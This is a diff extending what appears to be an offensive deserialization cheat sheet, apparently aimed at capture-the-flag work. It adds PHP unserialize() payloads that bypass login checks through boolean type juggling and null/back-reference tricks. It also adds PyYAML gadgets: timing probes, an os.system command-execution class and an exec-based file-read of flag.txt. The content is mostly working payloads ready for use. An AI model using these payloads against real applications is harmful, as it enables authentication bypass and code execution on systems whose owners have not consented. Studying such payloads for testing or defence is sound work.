@@ -29,6 +29,27 @@ never hand-type them:
 // private $x  -> s:6:"\0Cls\0x";   protected $y -> s:4:"\0*\0y";
 ```
 
+## PHP — auth bypass via unserialize() (no gadget chain needed)
+When the app `unserialize()`s a cookie/field and then loose-compares fields
+(`==`) for an auth check, you can win without any class gadget:
+
+Type juggling — `true == "any-string"` is true, so booleans beat the stored
+secret on a loose compare:
+```php
+// app: if ($d['username']==$adminName && $d['password']==$adminPassword) {...}
+a:2:{s:8:"username";b:1;s:8:"password";b:1;}     // both become bool(true)
+```
+Reference / null trick — `N` (null) plus `R:n` (a back-reference to the n-th
+serialized value) makes two fields point at the SAME value, so a check like
+`$guess === $secretCode` passes even when the code is randomized server-side:
+```php
+// app: $obj->secretCode = rand(...); if ($obj->guess === $obj->secretCode) win;
+O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
+a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}        // array form of the same idea
+```
+The hand-written `unserialize()` object format (counts and lengths MUST be
+exact): `O:<namelen>:"<Class>":<propcount>:{ s:<len>:"<prop>"; <value>; }`.
+
 ## PHP — PHAR metadata deserialization (no visible unserialize() needed)
 Any FS function on a `phar://` URL deserializes the archive's metadata object.
 Build a JPG-polyglot PHAR whose metadata is your gadget:
@@ -100,6 +121,24 @@ class E:
     def __reduce__(self):
         import os; return (os.system, ("id",))
 print(yaml.dump(E()))    # emits a !!python/object tag the loader will run
+```
+**Version note:** PyYAML ≥ 6.0 switched `yaml.load`'s default to `SafeLoader`,
+so the live sinks are now `yaml.unsafe_load(...)` and
+`yaml.load(x, Loader=yaml.UnsafeLoader)`. On those (or any pre-6.0 `yaml.load`)
+the tags above run. Sleep / range tags are quiet timing oracles:
+```yaml
+!!python/object/apply:time.sleep [10]            # confirms unsafe load via delay
+!!python/object/apply:builtins.range [1, 10, 1]  # harmless object-build probe
+```
+No-`os.system` file-read gadget — reconstruct a `str` whose tuple-state runs an
+`exec`, useful when only built-ins are reachable:
+```yaml
+!!python/object/new:str
+state: !!python/tuple
+- 'print(getattr(open("flag.txt"), "read")())'
+- !!python/object/new:Warning
+  state:
+    update: !!python/name:exec
 ```
 
 ## Python — jsonpickle (revives arbitrary types from JSON)
